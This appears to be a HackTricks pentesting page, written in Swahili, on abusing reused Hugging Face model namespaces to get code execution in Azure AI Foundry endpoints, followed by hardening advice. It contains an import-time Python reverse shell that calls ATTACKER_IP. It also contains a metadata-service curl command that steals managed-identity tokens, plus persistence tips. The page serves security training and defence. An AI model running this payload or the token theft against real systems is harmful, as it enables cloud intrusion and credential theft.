# Azure - AI Foundry Post-Exploitation kupitia Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Senario

- Azure AI Foundry Model Catalog inajumuisha modeli nyingi za Hugging Face (HF) zinazoweza ku-deploy kwa bonyeza moja.
- Vitambulishi vya modeli za HF ni Author/ModelName. Ikiwa mwandishi/orga wa HF afutwe, mtu yeyote anaweza kujiandikisha tena kama mwandishi huyo na kuchapisha modeli yenye ModelName ile ile katika path ya zamani.
- Pipelines na catalogs zinazovutana kwa jina tu (bila commit pinning/integrity) zitatatua kwa repos zinazodhibitiwa na mshambuliaji. Wakati Azure inapo-deploy modeli, loader code inaweza kutekelezwa katika mazingira ya endpoint, ikitoa RCE kwa ruhusa za endpoint hiyo.

Mifano ya kawaida ya HF takeover:
- Uondoaji wa umiliki: Path ya zamani inaonyesha 404 hadi takeover.
- Uhamisho wa umiliki: Path ya zamani inarudisha 307 kwenda kwa mwandishi mpya wakati mwandishi wa zamani bado yupo. Ikiwa mwandishi wa zamani baadaye afutwe na kujisajili tena, redirect inavunjika na repo ya mshambuliaji hutoa huduma kwenye path ya zamani.

## Kutambua Namespaces Zinazoweza Kutumika Tena (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Mtiririko wa Shambulio kutoka Mwanzo hadi Mwisho dhidi ya Azure AI Foundry

1) Katika Katalogi ya Modeli, tafuta modeli za HF ambazo waandishi wa awali walifutwa au kuhamishwa (muandishi wa zamani ameondolewa) kwenye HF.  
2) Sajili tena muandishi aliyeachwa kwenye HF na uunde tena ModelName.  
3) Chapisha repo yenye madhara inayojumuisha loader code inayotekelezwa wakati wa import au inayohitaji trust_remote_code=True.  
4) Weka Author/ModelName ya zamani kutoka Azure AI Foundry. Jukwaa linavuta repo ya mdukuzi; loader inatekelezwa ndani ya container/VM ya endpoint ya Azure, ikitoa RCE na ruhusa za endpoint.

Mfano wa kipande cha payload kinachotekelezwa wakati wa import (kwa maonyesho tu):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Maelezo
- AI Foundry deployments ambazo zinaunganisha HF kwa kawaida hufanya clone na kuimport moduli za repo zinazotajwa katika model’s config (mfano, auto_map), ambazo zinaweza kusababisha code execution. Baadhi ya njia zinahitaji trust_remote_code=True.
- Ufikiaji kwa kawaida unaendana na ruhusa za endpoint’s managed identity/service principal. Chukulia hii kama initial access foothold kwa ajili ya data access na lateral movement ndani ya Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Orodhesha environment variables na MSI endpoints kwa tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Kagua uhifadhi uliounganishwa, vibaki vya modeli, na huduma za Azure zinazoweza kufikiwa ukitumia token uliopata.
- Fikiria persistence kwa kuacha poisoned model artifacts ikiwa jukwaa linarudisha kutoka HF.

## Mwongozo wa Kinga kwa Watumiaji wa Azure AI Foundry

- Pin modeli kwa commit wakati wa kupakia kutoka HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Fanya mirror ya HF models zilizothibitishwa kwenye registry ya ndani inayotegemewa na uzitekeleze kutoka huko.
- Endelea kuchunguza codebases na defaults/docstrings/notebooks kwa Author/ModelName zilizowekwa hard-coded ambazo zimefutwa/kuhamishwa; sasisha au pin.
- Thibitisha uwepo wa mwandishi na asili ya modeli kabla ya deployment.

## Recognition Heuristics (HTTP)

- Mwandishi aliyefutwa: ukurasa wa mwandishi 404; njia ya modeli ya zamani 404 hadi takeover.
- Modeli iliyohamishwa: njia ya zamani 307 kwenda kwa mwandishi mpya wakati mwandishi wa zamani bado yupo; ikiwa mwandishi wa zamani baadaye anafutwa na kujiandikisha tena, njia ya zamani itahudumia maudhui ya mshambuliaji.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Marejeo

- Tazama mbinu pana na maelezo ya mnyororo wa ugavi:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Marejeo

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
